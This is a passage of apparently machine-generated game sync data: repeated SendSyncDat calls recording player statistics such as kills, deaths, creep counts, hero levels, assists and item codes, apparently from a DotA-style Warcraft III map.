	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 79);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 7);
	SendSyncDat("dr.x", "Data", "CSK2", 88);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 13);
	SendSyncDat("dr.x", "Data", "CSK8", 64);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 55);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 48);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 3);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 24);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 43);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 2);
	SendSyncDat("dr.x", "Data", "CSK11", 38);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse6", 11);
	SendSyncDat("dr.x", "Data", "Level12", 11);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level13", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895864);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895864);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level13", 10);
	SendSyncDat("dr.x", "Data", "Level11", 3);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Level16", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero1", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Hero5", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Level14", 8);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895859);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse4", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "Level13", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896116);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896903);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "Level10", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Hero1", 11);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Level17", 7);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level12", 9);
	SendSyncDat("dr.x", "Data", "Tower022", 10);
	SendSyncDat("dr.x", "Data", "Tower010", 7);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896907);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "CSK1", 41);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 8);
	SendSyncDat("dr.x", "Data", "CSK7", 124);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 24);
	SendSyncDat("dr.x", "Data", "CSK2", 90);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 22);
	SendSyncDat("dr.x", "Data", "CSK8", 73);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 63);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 60);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 11);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 30);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 43);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 4);
	SendSyncDat("dr.x", "Data", "CSK11", 49);
	SendSyncDat("dr.x", "Data", "CSD11", 4);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895874);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895874);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895890);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896115);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227897137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero1", 8);
	SendSyncDat("dr.x", "Data", "Assist11", 1);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "Level14", 11);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level14", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "Level15", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level13", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "RuneUse2", 10);
	SendSyncDat("dr.x", "Data", "PUI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 0);
	SendSyncDat("dr.x", "Data", "PUI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902791);
	SendSyncDat("dr.x", "Data", "Level18", 7);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895892);
	SendSyncDat("dr.x", "Data", "Hero5", 11);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Level19", 7);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227902512);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227901494);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227903809);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896903);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227897158);
	SendSyncDat("dr.x", "Data", "Level13", 9);
	SendSyncDat("dr.x", "Data", "Level15", 11);
	SendSyncDat("dr.x", "Data", "Hero3", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "Tower020", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Courier1", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "RuneStore5", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896116);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "Level14", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895892);
	SendSyncDat("dr.x", "Data", "Level16", 8);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Level20", 7);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895887);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895859);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895887);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896400);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896904);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227900994);
	SendSyncDat("dr.x", "Data", "Tower021", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900744);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "CSK1", 41);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 8);
	SendSyncDat("dr.x", "Data", "CSK7", 151);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 36);
	SendSyncDat("dr.x", "Data", "CSK2", 96);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 24);
	SendSyncDat("dr.x", "Data", "CSK8", 88);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 65);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 77);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 16);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 34);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 55);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 4);
	SendSyncDat("dr.x", "Data", "CSK11", 67);
	SendSyncDat("dr.x", "Data", "CSD11", 5);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Level17", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Hero5", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Assist9", 5);
	SendSyncDat("dr.x", "Data", "Assist10", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level21", 7);
	SendSyncDat("dr.x", "Data", "Level14", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
